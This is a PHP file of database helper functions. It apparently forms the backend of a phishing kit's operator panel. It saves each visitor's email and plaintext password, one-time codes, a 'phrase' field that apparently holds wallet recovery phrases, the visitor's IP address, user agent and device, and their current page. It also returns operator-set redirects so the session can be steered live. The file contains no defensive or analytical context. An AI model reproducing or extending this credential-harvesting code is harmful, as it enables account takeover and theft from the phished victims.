<?php
require_once(__DIR__."/../db-connect.php");

function insertEmailIfNotExists() {
    $pdo = $GLOBALS['pdo'];
    if (isset($_SESSION["email"])) {
        $email = htmlspecialchars($_SESSION["email"]);
        try {
            $emailExistsQuery = "SELECT COUNT(*) FROM clients WHERE email = :email";
            $checkStmt = $pdo->prepare($emailExistsQuery);
            $checkStmt->bindParam(':email', $email);
            $checkStmt->execute();
            $emailCount = $checkStmt->fetchColumn();

            if ($emailCount == 0) {
                $insertEmailQuery = "INSERT INTO clients (email) VALUES (:email)";
                $stmt = $pdo->prepare($insertEmailQuery);
                $stmt->bindParam(':email', $email);
                $stmt->execute();
            }
        } catch (PDOException $e) {
            error_log("Error inserting email: " . $e->getMessage());
        }
    }
}

function insertPassword() {
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["password"])) {
        $password = htmlspecialchars($_SESSION["password"]);
        $email = htmlspecialchars($_SESSION["email"]);
        
        try {
            $updatePasswordQuery = "UPDATE clients SET password = :password WHERE email = :email";
            $stmt = $pdo->prepare($updatePasswordQuery);
            $stmt->bindParam(':password', $password);
            $stmt->bindParam(':email', $email);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating password: " . $e->getMessage());
        }
    }
}

function update_status($status) {
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["email"])) {
        $email = htmlspecialchars($_SESSION["email"]);
        try {
            $updateStatusQuery = "UPDATE clients SET status = :status WHERE email = :email";
            $stmt = $pdo->prepare($updateStatusQuery);
            $stmt->bindParam(':status', $status);
            $stmt->bindParam(':email', $email);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating status: " . $e->getMessage());
        }
    }
}


function update_current_page($page) {
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["email"])) {
        $email = htmlspecialchars($_SESSION["email"]);
        try {
            $updateCurrentPageQuery = "UPDATE clients SET current_page = :current_page WHERE email = :email";
            $stmt = $pdo->prepare($updateCurrentPageQuery);
            $stmt->bindParam(':current_page', $page);
            $stmt->bindParam(':email', $email);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating current page: " . $e->getMessage());
        }
    }
}


function update_ip_useragent($ip, $user_agent) {
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["email"])) {
        $email = htmlspecialchars($_SESSION["email"]);
        try {
            $updateIpUseragentQuery = "UPDATE clients SET ip = :ip, useragent = :user_agent WHERE email = :email";
            $stmt = $pdo->prepare($updateIpUseragentQuery);
            $stmt->bindParam(':ip', $ip);
            $stmt->bindParam(':user_agent', $user_agent);
            $stmt->bindParam(':email', $email);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating IP and User Agent: " . $e->getMessage());
        }
    }
}


function update_device_info ($device_info) {
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["email"])) {
        $email = htmlspecialchars($_SESSION["email"]);
        try {
            $updateDeviceInfoQuery = "UPDATE clients SET device = :device_info WHERE email = :email";
            $stmt = $pdo->prepare($updateDeviceInfoQuery);
            $stmt->bindParam(':device_info', $device_info);
            $stmt->bindParam(':email', $email);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating device info: " . $e->getMessage());
        }
    }
}

function check_redirect(){
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["email"])) {
        $email = htmlspecialchars($_SESSION["email"]);
        try {
            $checkRedirectQuery = "SELECT `page` FROM clients WHERE email = :email";
            $stmt = $pdo->prepare($checkRedirectQuery);
            $stmt->bindParam(':email', $email);
            $stmt->execute();

            $check_redirect = $stmt->fetchColumn();
            
            $updatePageQuery = "UPDATE clients SET `page` = '' WHERE email = :email";
            $stmt = $pdo->prepare($updatePageQuery);
            $stmt->bindParam(':email', $email);
            $stmt->execute();
            return $check_redirect;
        } catch (PDOException $e) {
            error_log("Error checking redirect: " . $e->getMessage());
        }
    }
}



function update_code($code){
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["email"])) {
        $email = htmlspecialchars($_SESSION["email"]);
        try {
            $updateCode = "UPDATE clients SET code = :code WHERE email = :email";
            $stmt = $pdo->prepare($updateCode);
            $stmt->bindParam(':code', $code);
            $stmt->bindParam(':email', $email);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating code: " . $e->getMessage());
        }
    }
}


function update_phrase($phrase){
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["email"])) {
        $email = htmlspecialchars($_SESSION["email"]);
        try {
            $updatePhraseQuery = "UPDATE clients SET phrase = :phrase WHERE email = :email";
            $stmt = $pdo->prepare($updatePhraseQuery);
            $stmt->bindParam(':phrase', $phrase);
            $stmt->bindParam(':email', $email);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating phrase: " . $e->getMessage());
        }
    }
}


function update_url($url){
    $pdo = $GLOBALS["pdo"];
    if (isset($_SESSION["email"])) {
        $email = htmlspecialchars($_SESSION["email"]);

        try {
            $updateUrlQuery = "UPDATE clients SET url = :url WHERE email = :email";
            $stmt = $pdo->prepare($updateUrlQuery);
            $stmt->bindParam(':url', $url);
            $stmt->bindParam(':email', $email);
            $stmt->execute();
        } catch (PDOException $e) {
            error_log("Error updating url: " . $e->getMessage());
        }
    }
}

